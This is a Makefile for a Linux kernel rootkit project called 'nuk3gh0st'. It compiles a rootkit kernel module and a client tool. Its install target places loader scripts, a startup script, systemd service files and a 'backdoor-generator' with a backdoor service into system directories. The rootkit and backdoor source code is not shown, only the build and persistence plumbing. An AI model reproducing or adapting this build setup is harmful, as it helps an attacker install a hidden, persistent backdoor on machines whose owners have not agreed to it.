.PHONY: all
obj-m := rootkit.o
KERNEL_DIR = /lib/modules/$(shell uname -r)/build
PWD = $(shell pwd)
all: rootkit client
rootkit:
	$(MAKE) -C $(KERNEL_DIR) SUBDIRS=$(PWD)
client:
	gcc -o nuk3gh0st nuk3gh0st.c --std=gnu99 -Wall -Wextra -pedantic
install:
	-mkdir /usr/share/nuk3gh0st
	-cp nuk3gh0st /usr/bin/nuk3gh0st
	-cp rootkit.ko /usr/share/nuk3gh0st/rootkit.ko
	-cp load-nuk3gh0st /usr/bin/load-nuk3gh0st
	-cp unload-nuk3gh0st /usr/bin/unload-nuk3gh0st
	-cp enable-nuk3gh0st /usr/bin/enable-nuk3gh0st
	-cp disable-nuk3gh0st /usr/bin/disable-nuk3gh0st
	-cp nuk3gh0st.startup /usr/share/nuk3gh0st/nuk3gh0st.startup
	-cp nuk3gh0st.service /usr/share/nuk3gh0st/nuk3gh0st.service
	-cp nuk3gh0st.conf /usr/share/nuk3gh0st/nuk3gh0st.conf
	-cp backdoor-generator /usr/bin/backdoor-generator
	-cp backdoor.service /usr/share/nuk3gh0st/backdoor.service
	-cp backdoor.conf /usr/share/nuk3gh0st/backdoor.conf
	chmod +x /usr/bin/load-nuk3gh0st
	chmod +x /usr/bin/unload-nuk3gh0st
	chmod +x /usr/bin/enable-nuk3gh0st
	chmod +x /usr/bin/disable-nuk3gh0st
	chmod +x /usr/share/nuk3gh0st/nuk3gh0st.startup
	chmod +x /usr/bin/backdoor-generator
	chmod +x /usr/share/nuk3gh0st/backdoor.service
uninstall:
	-rm /usr/bin/nuk3gh0st
	-rm /usr/bin/load-nuk3gh0st
	-rm /usr/bin/unload-nuk3gh0st
	-rm /usr/bin/enable-nuk3gh0st
	-rm /usr/bin/disable-nuk3gh0st
	-rm /usr/bin/backdoor-generator
	-rm -rf /usr/share/nuk3gh0st
clean:
	-rm -rf *.o *.ko *.symvers *.mod.* *.order nuk3gh0st
